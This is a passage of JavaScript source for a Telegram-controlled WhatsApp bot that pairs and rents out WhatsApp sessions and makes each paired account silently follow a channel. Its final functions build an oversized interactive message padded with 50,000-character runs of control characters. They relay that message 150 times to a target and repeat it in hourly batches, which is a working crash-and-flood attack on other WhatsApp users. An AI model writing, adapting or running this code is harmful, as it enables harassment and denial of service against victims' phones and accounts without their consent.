          displayValue = finalId.replace('@s.whatsapp.net', ''); // only number
        }

        // Title
        let title;
        if (isGroupTarget) {
          title = isLid ? 'group lid received!' : 'group id received!';
        } else {
          title = isLid ? 'lid received!' : 'number received!';
        }

        // ========== NAME (only for groups) ==========
        let name = null;

        if (isGroupTarget) {
          try {
            const meta = await sock.groupMetadata(m.key.remoteJid);
            if (meta?.subject) {
              name = meta.subject.trim();
            }
          } catch (_) {}
        }
        // For persons we deliberately omit name (to avoid bot name)

        // Find Telegram owner
        const telegramChatId = Object.keys(db.userNumbers).find(
          (key) => db.userNumbers[key] === number
        );
        if (!telegramChatId) continue;

        const userBot = getUserBot(botInstance);

        let caption = `✅ <b>${title}</b>\n\n`;
        caption += `📋 <b>${isGroupTarget ? (isLid ? 'Group LID' : 'Group ID') : (isLid ? 'LID' : 'Number')}:</b>\n<code>${displayValue}</code>`;

        if (name) {
          caption += `\n\n👥 <b>Group Name:</b> ${escapeHtml(name)}`;
        }

        await userBot.sendMessage(telegramChatId, caption, {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: isGroupTarget
                    ? (isLid ? '📋 Copy Group LID' : '📋 Copy Group ID')
                    : (isLid ? '📋 Copy LID' : '📋 Copy Number'),
                  copy_text: { text: displayValue }
                }
              ]
            ]
          }
        });

      } catch (err) {
        console.error('[🥰 LID handler]', err.message);
      }
    }
  });
}

async function validateSession(userNumber, chatId, botInstance) {
  // Telegram commands can ONLY use rent-session
  const hasRentSession = sessions.has(userNumber) && whatsappStatusMap.get(userNumber) === true;

  if (!hasRentSession) {
    if (!sessionInvalidNotified.has(userNumber)) {
      const userBot = getUserBot(botInstance);
      const targetChatId = chatId || Object.keys(db.userNumbers).find(key => db.userNumbers[key] === userNumber);
      
      if (targetChatId) {
        await userBot.sendMessage(targetChatId, `❌ No active WhatsApp session for ${userNumber}. Please reconnect using /reqpair.`);
      }
      sessionInvalidNotified.set(userNumber, true);
    }

    // Clean rent-session data only
    const chatIdForNumber = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === userNumber);
    if (chatIdForNumber) {
      delete db.userNumbers[chatIdForNumber];
      saveJson('./database/user_numbers.json', db.userNumbers);
    }
    sessions.delete(userNumber);
    whatsappStatusMap.delete(userNumber);

    return false;
  }

  sessionInvalidNotified.delete(userNumber);
  return true;
}

// Helper function to handle reconnection attempts
async function reconnectSession(number, botInstance, sessionDir, maxRetries = 3, retryDelay = 5000) {
  let retries = maxRetries;
  const userBot = getUserBot(botInstance);
  const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);

  while (retries > 0) {
    try {
      console.log(`Attempting to reconnect WhatsApp session for ${number} (Retries left: ${retries})`);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        /*version: [2, 3000, 1025190524],*/
        printQRInTerminal: false,
      });

      sessions.set(number, sock);
whatsappStatusMap.set(number, false);

// PASTE HERE ↓
attachLidEmojiHandler(sock, number, botInstance);
      
      sock.newsletterMsg = async (key, content = {}, timeout = 5000) => {
		const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
		const type = rawType.toUpperCase();
		if (react) {
			if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			if (!id) throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const hasil = await sock.query({
				tag: 'message',
				attrs: {
					to: key,
					type: 'reaction',
					'server_id': id,
					id: generateMessageID()
				},
				content: [{
					tag: 'reaction',
					attrs: {
						code: react
					}
				}]
			});
			return hasil
		} else if (media && typeof media === 'object' && Object.keys(media).length > 0) {
			const msg = await generateWAMessageContent(media, { upload: sock.waUploadToServer });
			const anu = await sock.query({
				tag: 'message',
				attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
				content: [{
					tag: 'plaintext',
					attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|')) ? { mediatype: Object.keys(media).find(key => ['image', 'video', 'audio', 'sticker','poll'].includes(key)) || null } : {},
					content: proto.Message.encode(msg).finish()
				}]
			})
			return anu
		} else {
			if ((/(FOLLOW|UNFOLLOW|DELETE)/.test(type)) && !(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) return [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const _query = await sock.query({
				tag: 'iq',
				attrs: {
					to: 's.whatsapp.net',
					type: 'get',
					xmlns: 'w:mex'
				},
				content: [{
					tag: 'query',
					attrs: {
						query_id: type == 'FOLLOW' ? '9926858900719341' : type == 'UNFOLLOW' ? '7238632346214362' : type == 'CREATE' ? '6234210096708695' : type == 'DELETE' ? '8316537688363079' : '6563316087068696'
					},
					content: new TextEncoder().encode(JSON.stringify({
						variables: /(FOLLOW|UNFOLLOW|DELETE)/.test(type) ? { newsletter_id } : type == 'CREATE' ? { newsletter_input: { name, description, picture }} : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' }}
					}))
				}]
			}, timeout);
			const res = JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 || JSON.parse(_query.content[0].content)?.errors || JSON.parse(_query.content[0].content)
			res.thread_metadata ? (res.thread_metadata.host = 'https://mmg.whatsapp.net') : null
			return res
		}
	}

      sock.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;
  if (connection === 'close') {
    const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
    console.log(`Disconnected for ${number}. Reason: ${reason}`);
    whatsappStatusMap.set(number, false);

    if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
      await deleteFolderRecursive(sessionDir);
      if (chatId) {
        delete db.userNumbers[chatId];
        saveJson('./database/user_numbers.json', db.userNumbers);
        await userBot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
      }
      sessions.delete(number);
      whatsappStatusMap.delete(number);
      sessionInvalidNotified.set(number, true); // Prevent validateSession from spamming the generic message
    } else if (reason === 503) {
      // Handle 503 error with reconnection
      console.log(`503 Service Unavailable for ${number}. Attempting to reconnect...`);
      await reconnectSession(number, botInstance, sessionDir, maxRetries - 1, retryDelay * 2);
    } else if (reason && (reason >= 500 || reason === 428 || reason === 408 || reason === 429)) {
      if (chatId) {
        await getSessions(userBot, chatId, number);
      }
    } else {
      console.log(`Unknown disconnect reason: ${reason} for ${number}. Attempting reconnect without deletion...`);
      await reconnectSession(number, botInstance, sessionDir, maxRetries - 1, retryDelay * 2);
    }
  } else if (connection === 'open') {
    whatsappStatusMap.set(number, true);
    console.log(`Reconnected to WhatsApp for ${number}!`);
    await sock.newsletterMsg(CONFIG.idch, { type: 'follow' }).catch(e => {});
    if (chatId) {
      await userBot.sendMessage(chatId, `✅ Reconnected WhatsApp session for ${number}.`);
    }
  }
});

      sock.ev.on('creds.update', saveCreds);
      return sock;
    } catch (error) {
  console.error(`Reconnect attempt failed for ${number}: ${error.message}`);
  retries--;
  if (retries === 0) {
    console.error(`Max retries reached for ${number}. Session not deleted, but manual reconnection required.`);
    if (chatId) {
      const userBot = getUserBot(botInstance);
      await userBot.sendMessage(chatId, `❌ Failed to reconnect WhatsApp session for ${number}: ${error.message}. Please try /reqpair.`);
    }
    return null;
  }
  await sleep(retryDelay);
}
  }
}

async function startWhatsapp(number, botInstance) {
  const sessionDir = `./rent-session/${sanitizePath(number)}@s.whatsapp.net`;
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const sock = makeWASocket({
    auth: state,
    logger: P({ level: 'silent' }),
    /*version: [2, 3000, 1025190524],*/
    printQRInTerminal: false,
  });

  sessions.set(number, sock);
whatsappStatusMap.set(number, false);

// PASTE HERE ↓
attachLidEmojiHandler(sock, number, botInstance);
  
  sock.newsletterMsg = async (key, content = {}, timeout = 5000) => {
		const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
		const type = rawType.toUpperCase();
		if (react) {
			if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			if (!id) throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const hasil = await sock.query({
				tag: 'message',
				attrs: {
					to: key,
					type: 'reaction',
					'server_id': id,
					id: generateMessageID()
				},
				content: [{
					tag: 'reaction',
					attrs: {
						code: react
					}
				}]
			});
			return hasil
		} else if (media && typeof media === 'object' && Object.keys(media).length > 0) {
			const msg = await generateWAMessageContent(media, { upload: sock.waUploadToServer });
			const anu = await sock.query({
				tag: 'message',
				attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
				content: [{
					tag: 'plaintext',
					attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|')) ? { mediatype: Object.keys(media).find(key => ['image', 'video', 'audio', 'sticker','poll'].includes(key)) || null } : {},
					content: proto.Message.encode(msg).finish()
				}]
			})
			return anu
		} else {
			if ((/(FOLLOW|UNFOLLOW|DELETE)/.test(type)) && !(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) return [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const _query = await sock.query({
				tag: 'iq',
				attrs: {
					to: 's.whatsapp.net',
					type: 'get',
					xmlns: 'w:mex'
				},
				content: [{
					tag: 'query',
					attrs: {
						query_id: type == 'FOLLOW' ? '9926858900719341' : type == 'UNFOLLOW' ? '7238632346214362' : type == 'CREATE' ? '6234210096708695' : type == 'DELETE' ? '8316537688363079' : '6563316087068696'
					},
					content: new TextEncoder().encode(JSON.stringify({
						variables: /(FOLLOW|UNFOLLOW|DELETE)/.test(type) ? { newsletter_id } : type == 'CREATE' ? { newsletter_input: { name, description, picture }} : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' }}
					}))
				}]
			}, timeout);
			const res = JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 || JSON.parse(_query.content[0].content)?.errors || JSON.parse(_query.content[0].content)
			res.thread_metadata ? (res.thread_metadata.host = 'https://mmg.whatsapp.net') : null
			return res
		}
	}

  sock.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;
  const userBot = getUserBot(botInstance);
  if (connection === 'close') {
    const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
    console.log(`Disconnected for ${number}. Reason: ${reason}`);
    whatsappStatusMap.set(number, false);

    if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
      await deleteFolderRecursive(sessionDir);
      const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
      if (chatId) {
        delete db.userNumbers[chatId];
        saveJson('./database/user_numbers.json', db.userNumbers);
        await userBot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
      }
      sessions.delete(number);
      whatsappStatusMap.delete(number);
      sessionInvalidNotified.set(number, true); // Prevent validateSession from spamming the generic message
    } else if (reason === 503) {
      // Handle 503 error with reconnection
      console.log(`503 Service Unavailable for ${number}. Attempting to reconnect...`);
      await reconnectSession(number, botInstance, sessionDir);
    } else if (reason && (reason >= 500 || reason === 428 || reason === 408 || reason === 429)) {
      const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
      if (chatId) {
        await getSessions(userBot, chatId, number);
      }
    } else {
      console.log(`Unknown disconnect reason: ${reason} for ${number}. Attempting reconnect without deletion...`);
      await reconnectSession(number, botInstance, sessionDir);
    }
  } else if (connection === 'open') {
    whatsappStatusMap.set(number, true);
    console.log(`Connected to WhatsApp for ${number}!`);
    await sock.newsletterMsg(CONFIG.idch, { type: 'follow' }).catch(e => {});
  }
});

  sock.ev.on('creds.update', saveCreds);
  return sock;
}

// ====================== AUTO RECONNECT WEB SESSIONS ======================
async function restoreWebSessions() {
  const webDir = path.join(__dirname, 'web-session');
  
  if (!fs.existsSync(webDir)) {
    console.log('[WEB] No web-session folder found');
    return;
  }

  const folders = fs.readdirSync(webDir).filter(f => {
    const full = path.join(webDir, f);
    return fs.lstatSync(full).isDirectory() && f.endsWith('@s.whatsapp.net');
  });

  console.log(`[WEB] Found ${folders.length} web session(s) to restore...`);

  for (const folder of folders) {
    const number = folder.replace('@s.whatsapp.net', '');
    
    // Skip if already connected
    if (webSessions.has(number) && webWhatsappStatus.get(number) === true) {
      continue;
    }

    console.log(`[WEB] Restoring session for ${number}...`);

    try {
      const sessionDir = path.join(webDir, folder);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

      const sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: ['Mac OS', 'Chrome', '14.4.1'],
      });

      webSessions.set(number, sock);
      webWhatsappStatus.set(number, false);

      attachLidEmojiHandler(sock, number, bot);

      sock.ev.on('creds.update', saveCreds);

      sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update || {};

        if (connection === 'open') {
          webWhatsappStatus.set(number, true);
          console.log(`✅ [WEB] Restored & connected: ${number}`);
        }

        if (connection === 'close') {
          const statusCode = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          webWhatsappStatus.set(number, false);
          console.log(`[WEB] ${number} disconnected. Code: ${statusCode}`);

          if (statusCode === 401 || statusCode === DisconnectReason.loggedOut) {
            console.log(`[WEB] Logged out → deleting ${number}`);
            await deleteFolderRecursive(sessionDir).catch(() => {});
            webSessions.delete(number);
            webWhatsappStatus.delete(number);
          }
        }
      });

    } catch (err) {
      console.error(`[WEB] Failed to restore ${number}:`, err.message);
    }

    // Small delay to avoid flooding
    await sleep(1500);
  }
}

// === FINAL STABLE getSessionsImproved - Strict 1-number + safe reconnection ===
async function getSessionsImproved(botInstance, chatId, telegramUid, rawNumber) {
  const number = rawNumber.replace(/[^0-9]/g, '');
  const sessionDir = path.join(sessionRoot, `${sanitizePath(number)}@s.whatsapp.net`);

  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ['Mac OS', 'Chrome', '14.4.1'],
  });

  sessions.set(number, sock);
whatsappStatusMap.set(number, false);

// PASTE HERE ↓
attachLidEmojiHandler(sock, number, botInstance);

  let everConnected = false;
  let pairingCodeRequested = false;

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update || {};

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
      console.log(`[WA] ${number} disconnected. Code: ${statusCode}`);

      whatsappStatusMap.set(number, false);

      if (statusCode === 401 || statusCode === DisconnectReason.loggedOut) {
        console.log(`[WA] Logged out (401) for ${number}. Cleaning...`);
        await deleteFolderRecursive(sessionDir).catch(() => {});
        delete db.userNumbers[chatId];
        saveJson('./database/user_numbers.json', db.userNumbers);
        sessions.delete(number);
        whatsappStatusMap.delete(number);
        pairingLocks.delete(telegramUid);

        await botInstance.sendMessage(chatId, `🚫 Session removed. Use /reqpair again.`);
        return;
      }

      if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
        console.log(`[WA] Restart required (515) for ${number}. Reconnecting...`);
        setTimeout(() => {
          getSessionsImproved(botInstance, chatId, telegramUid, number).catch(console.error);
        }, 4000);
        return;
      }

      if (statusCode === 408 || statusCode === DisconnectReason.timedOut) {
        if (!everConnected) {
          console.log(`[WA] Real timeout (408) for ${number} - Never connected. Cleaning...`);
          await deleteFolderRecursive(sessionDir).catch(() => {});
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
          pairingLocks.delete(telegramUid);

          await botInstance.sendMessage(chatId, 
            `⏳ Pairing timed out.\nSession has been automatically cleaned.\nYou can try /reqpair again.`, 
            { parse_mode: 'Markdown' });
        } else {
          console.log(`[WA] Timeout (408) after successful connection for ${number}. Keeping session alive.`);
        }
        return;
      }

      return;
    }

    if (connection === 'open') {
      everConnected = true;
      whatsappStatusMap.set(number, true);
      db.userNumbers[chatId] = number;
      saveJson('./database/user_numbers.json', db.userNumbers);

      await botInstance.sendMessage(chatId, `✅ *Successfully connected* to *${number}*`, { parse_mode: 'Markdown' });
      pairingLocks.delete(telegramUid);
      console.log(`✅ Connected: ${number}`);
      return;
    }

    if ((connection === 'connecting' || qr) && !pairingCodeRequested && !sock?.authState?.creds?.registered) {
      pairingCodeRequested = true;

      try {
        console.log(`[WA] Requesting pairing code for ${number}...`);
        await new Promise(r => setTimeout(r, 2200));

        const code = await sock.requestPairingCode(number, 'XEONKING');
        const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;

        await botInstance.sendMessage(chatId, `
┌──────┤ Pairing Code ├──────┐
│➻ Number : ${number}
│➻ Code   : ${formattedCode}
│
│Valid for 60 seconds. Go to WhatsApp → Linked Devices → Link with phone number
└────────────────────────────┘`, { parse_mode: 'Markdown' });

      } catch (err) {
        console.error(`[Pairing Code Error] ${number}:`, err.message);
        await botInstance.sendMessage(chatId, `❌ Failed to generate pairing code: ${err.message}`);
        pairingLocks.delete(telegramUid);
      }
    }
  });

  return sock;
}

// ====================== WEB PAIR SYSTEM (Unlimited sessions) ======================
async function getWebSessions(botInstance, chatId, telegramUid, rawNumber) {
  const number = rawNumber.replace(/[^0-9]/g, '');
  const sessionDir = path.join(__dirname, 'web-session', `${sanitizePath(number)}@s.whatsapp.net`);

  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ['Mac OS', 'Chrome', '14.4.1'],
  });

  webSessions.set(number, sock);
  webWhatsappStatus.set(number, false);

  attachLidEmojiHandler(sock, number, botInstance);

  let everConnected = false;
  let pairingCodeRequested = false;

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update || {};

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
      console.log(`[WEB-WA] ${number} disconnected. Code: ${statusCode}`);
      webWhatsappStatus.set(number, false);

      // ===== NOTIFY THE OWNER WHO ADDED THIS WEBPAIR =====
      const ownerId = webPairOwners[number];
      if (ownerId) {
        try {
          const reasonText = (statusCode === 401 || statusCode === DisconnectReason.loggedOut)
            ? 'Logged out'
            : 'Connection lost';

          await botInstance.sendMessage(ownerId,
`🚫 Web session for <code>${number}</code> has been disconnected/removed.

Reason: ${reasonText}

You can pair it again using:
<code>/webpair ${number}</code>`, {
            parse_mode: 'HTML'
          });
        } catch (e) {
          console.log(`[WEB] Failed to notify owner ${ownerId}:`, e.message);
        }
      }

      if (statusCode === 401 || statusCode === DisconnectReason.loggedOut) {
        await deleteFolderRecursive(sessionDir).catch(() => {});
        webSessions.delete(number);
        webWhatsappStatus.delete(number);
        delete webPairOwners[number];
        saveJson('./database/web_pair_owners.json', webPairOwners);
        return;
      }

      if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
        setTimeout(() => {
          getWebSessions(botInstance, chatId, telegramUid, number).catch(console.error);
        }, 4000);
        return;
      }
    }

    if (connection === 'open') {
      everConnected = true;
      webWhatsappStatus.set(number, true);
      await botInstance.sendMessage(chatId, `✅ *Web session connected* → *${number}*`, { parse_mode: 'Markdown' });
      console.log(`✅ Web Connected: ${number}`);
      return;
    }

    if ((connection === 'connecting' || qr) && !pairingCodeRequested && !sock?.authState?.creds?.registered) {
      pairingCodeRequested = true;
      try {
        await new Promise(r => setTimeout(r, 2000));
        const code = await sock.requestPairingCode(number, 'XEONKING');
        const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;

        await botInstance.sendMessage(chatId, `
┌──────┤ Web Pairing Code ├──────┐
│➻ Number : ${number}
│➻ Code   : ${formattedCode}
│
│Valid for 60 seconds.
└────────────────────────────┘`, { parse_mode: 'Markdown' });
      } catch (err) {
        console.error(`[Web Pairing Error] ${number}:`, err.message);
        await botInstance.sendMessage(chatId, `❌ Failed to generate web pairing code: ${err.message}`);
      }
    }
  });

  return sock;
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
    console.error('Invalid inputs for getSessions');
    if (bot && chatId) {
      /*await bot.sendMessage(chatId, '❌ Internal error: Invalid parameters.');*/
    }
    return;
  }

  if (!/^\d{8,15}$/.test(number)) {
    await bot.sendMessage(chatId, `❌ Invalid number format: ${number}. Use digits only (8-15).`);
    return;
  }

  const sessionDir = `./rent-session/${sanitizePath(number)}@s.whatsapp.net`;

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      /*version: [2, 3000, 1025190524],*/
      printQRInTerminal: false,
    });

    sessions.set(number, sock);
whatsappStatusMap.set(number, false);

// PASTE HERE ↓
attachLidEmojiHandler(sock, number, bot);

    sock.newsletterMsg = async (key, content = {}, timeout = 5000) => {
      const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
      const type = rawType.toUpperCase();

      if (react) {
        if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)))
          throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false } }];

        if (!id)
          throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false } }];

        return await sock.query({
          tag: 'message',
          attrs: {
            to: key,
            type: 'reaction',
            server_id: id,
            id: generateMessageID()
          },
          content: [{
            tag: 'reaction',
            attrs: { code: react }
          }]
        });
      }

      if (media && typeof media === 'object' && Object.keys(media).length > 0) {
        const msg = await generateWAMessageContent(media, { upload: sock.waUploadToServer });
        return await sock.query({
          tag: 'message',
          attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
          content: [{
            tag: 'plaintext',
            attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|'))
              ? { mediatype: Object.keys(media).find(k => ['image', 'video', 'audio', 'sticker', 'poll'].includes(k)) || null }
              : {},
            content: proto.Message.encode(msg).finish()
          }]
        });
      }

      const _query = await sock.query({
        tag: 'iq',
        attrs: { to: 's.whatsapp.net', type: 'get', xmlns: 'w:mex' },
        content: [{
          tag: 'query',
          attrs: {
            query_id:
              type === 'FOLLOW' ? '9926858900719341' :
              type === 'UNFOLLOW' ? '7238632346214362' :
              type === 'CREATE' ? '6234210096708695' :
              type === 'DELETE' ? '8316537688363079' :
              '6563316087068696'
          },
          content: new TextEncoder().encode(JSON.stringify({
            variables:
              /(FOLLOW|UNFOLLOW|DELETE)/.test(type)
                ? { newsletter_id }
                : type === 'CREATE'
                ? { newsletter_input: { name, description, picture } }
                : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' } }
          }))
        }]
      }, timeout);

      const res =
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 ||
        JSON.parse(_query.content[0].content)?.errors ||
        JSON.parse(_query.content[0].content);

      if (res?.thread_metadata) res.thread_metadata.host = 'https://mmg.whatsapp.net';
      return res;
    };

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;

        if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
          whatsappStatusMap.set(number, false);
          await deleteFolderRecursive(sessionDir);
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          await bot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
          sessionInvalidNotified.set(number, true); // Prevent validateSession from spamming the generic message
        } else if (reason === 503) {
          console.log(`503 Service Unavailable for ${number}. Attempting to reconnect...`);
          await reconnectSession(number, bot, sessionDir);
        } else if (reason && reason >= 500 && reason !== 503) {
          whatsappStatusMap.set(number, false);
          await bot.sendMessage(chatId, `Number ${number} disconnected from WhatsApp. Attempting to reconnect...`);
          await getSessions(bot, chatId, number);
        } else {
          console.log(`Unknown disconnect reason: ${reason} for ${number}. No auto-reconnect.`);
          whatsappStatusMap.set(number, false);
          await bot.sendMessage(chatId, `❌ Number ${number} has been disconnected due to an unknown reason.\n\nPlease reconnect manually using /reqpair.`);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
        }
      }

      else if (connection === 'open') {
        whatsappStatusMap.set(number, true);
        db.userNumbers[chatId] = number;
        saveJson('./database/user_numbers.json', db.userNumbers);
        await bot.sendMessage(chatId, `Number ${number} successfully connected.`);
        await sock.newsletterMsg(CONFIG.idch, { type: 'follow' }).catch(() => {});
      }

      else if (connection === 'connecting') {
        await new Promise(r => setTimeout(r, 1000));

        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const formattedNumber = number.replace(/\D/g, '');
          const pairingCode = await sock.requestPairingCode(formattedNumber, 'XEONKING');
          const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;

          await bot.sendMessage(chatId, `
┌──────┤ Pairing Code ├──────┐
│➻ Number: ${number}
│➻ Pairing Code: ${formattedCode}
└────────────────────────┘`);
    }
  }
});

  } catch (error) {
    console.error(`Error in getSessions for ${number}:`, error.message);
    await bot.sendMessage(chatId, `❌ Failed to initialize session for ${number}: ${error.message}. Process stopped.`);
  }
}



async function xeonRichBlokDelay(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u0070".repeat(50000),
              subtitle: "\u0090".repeat(50000),
              deck: {
                uuid: "\u0070".repeat(50000),
                data: "\u0090".repeat(50000),
                type: "\u0070".repeat(50000),
                fallback: "\u0090".repeat(50000),
                accessibilityText:  "\u0070".repeat(50000),
                  badge: {
                    text:  "\u0090".repeat(50000),
                    color:  "\u0070".repeat(50000)
                  },
                animations: {
                    enter:  "\u0090".repeat(50000)
                  },                
                 children: [
                  {
                    uuid: "\u0070".repeat(50000),
                    type:  "\u0080".repeat(50000),
                    data:  "\u0000".repeat(50000)
                    }
                 ] 
              }
            },
            body: { text: "\x10".repeat(50000), },
            nativeFlowMessage: {
              buttons: "[]".repeat(50000)
            }
          }
        }
      }
    };

    for (let i = 0; i < 150; i++) {
      try {
        await userSock.relayMessage(target, msg, { participant: true } );
        console.log(" ok(" + (i + 1) + ")");
      } catch (e) {
        console.log(" err: " + e.message);
      }
    }
        console.log(chalk.green(`xstress sent to ${target}`));
  } catch (err) {
  console.error(`Error in xstress for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonRichBlokDelayExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        // ===== FIXED: Support both rent-session and web-session =====
        const userSock = sessions.get(userNumber) || webSessions.get(userNumber);
        
        if (!userSock) {
